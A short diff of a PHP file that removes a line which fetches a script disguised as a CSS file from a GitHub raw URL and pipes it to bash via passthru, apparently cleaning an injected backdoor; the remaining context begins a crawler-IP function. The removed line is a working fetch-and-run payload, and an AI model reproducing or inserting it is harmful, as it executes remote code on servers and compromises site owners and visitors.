@@ -1,4 +1,4 @@
-passthru("curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/lin.css | bash");
+
 function spiderip($ip) {
         $spiderip = [
 
